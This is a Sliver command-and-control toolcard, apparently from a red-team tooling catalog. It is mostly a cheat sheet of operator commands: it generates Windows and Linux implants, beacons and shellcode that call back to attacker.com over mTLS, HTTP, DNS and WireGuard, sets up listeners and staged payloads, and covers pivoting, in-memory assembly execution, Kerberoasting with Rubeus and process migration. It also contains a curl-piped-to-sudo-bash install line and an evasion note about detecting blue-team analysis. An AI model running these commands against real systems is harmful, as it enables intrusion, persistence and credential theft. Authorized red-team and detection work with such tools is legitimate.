# sliver Toolcard

## Overview
- Summary: Sliver is a modern open-source C2 framework by BishopFox, written in Go. Dynamically compiled implants with per-binary asymmetric encryption keys and compile-time obfuscation. Supports C2 over mTLS, WireGuard, HTTP(S), and DNS with both session (interactive) and beacon (async) modes. Cross-platform server/client (Linux, macOS, Windows) with multiplayer support, Armory extensions, BOF/COFF loading, and .NET assembly execution. MITRE ATT&CK T1071.001 (Web Protocols), T1572 (Protocol Tunneling), T1573 (Encrypted Channel).

## Advanced Techniques
- Install: `curl https://sliver.sh/install | sudo bash` — start server: `sliver-server` — start client: `sliver`.
- Multiplayer: `new-operator --name teammate --lhost attacker.com` → teammate imports config: `sliver import ./teammate.cfg`.
- Session implant (interactive): `generate --mtls attacker.com --os windows --arch amd64 --save /tmp/implant.exe`.
- Beacon implant (async check-in): `generate beacon --http attacker.com --seconds 300 --jitter 50 --save /tmp/beacon.exe`.
- DNS implant: `generate beacon --dns attacker.com --os linux --save /tmp/dns_beacon` (T1071.004).
- WireGuard implant: `generate --wg attacker.com --os windows --save /tmp/wg_implant.exe` (T1572).
- Shellcode/DLL: `generate --mtls attacker.com -f shellcode --save /tmp/implant.bin`, `-f shared-lib` for DLL.
- Listeners: `mtls --lhost 0.0.0.0 --lport 8888`, `https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --lets-encrypt`, `dns --domains c2.example.com --lport 53`, `wg --lport 53 --nport 8888 --key-port 1337`.
- Staged payloads: `profiles new --mtls attacker.com --os windows --format shellcode profile1` → `stage-listener --url tcp://0.0.0.0:8443 --profile profile1`.
- Session interaction: `sessions` → `use <id>` → `shell`, `execute -o whoami`, `upload /local /remote`, `download /remote /local`, `screenshot` (T1113), `ps` (T1057).
- Pivoting: `portfwd add --bind 127.0.0.1:8080 --remote 10.0.0.5:80` (T1090), `socks5 start --port 1080`, `named-pipe --bind pipe-name`, `tcp-pivot --bind 0.0.0.0:9000`.
- In-memory execution: `execute-assembly /path/to/tool.exe args` (T1620), `sideload /path/to/dll.dll entrypoint`, `execute-bof /path/to/bof.o args`.
- Armory extensions: `armory install rubeus` → `rubeus kerberoast` (T1558.003), `armory install seatbelt` → `seatbelt -group=all` (T1082).
- Process migration: `migrate <pid>` (T1055) — token manipulation and Windows process injection supported.
- HTTPS C2 uses procedurally generated URLs (no static patterns) — DNS canary feature detects blue team analysis of implant samples.
- Detection indicators: unusual mTLS handshakes on non-standard ports, WireGuard traffic on unexpected ports, high-entropy HTTP paths, DNS beaconing with encoded subdomains.

## Safe Defaults
- Rate limits: use beacon mode with appropriate sleep/jitter for long-term ops (≥60s sleep, ≥30% jitter)
- Scope rules: explicit target only — mTLS preferred over HTTP for encrypted channel security

## Evidence Outputs
- outputs: evidence.json, findings.json, screenshots, downloaded files, credential dumps (as applicable)

## References
- https://github.com/BishopFox/sliver
- https://sliver.sh/
- https://github.com/sliverarmory
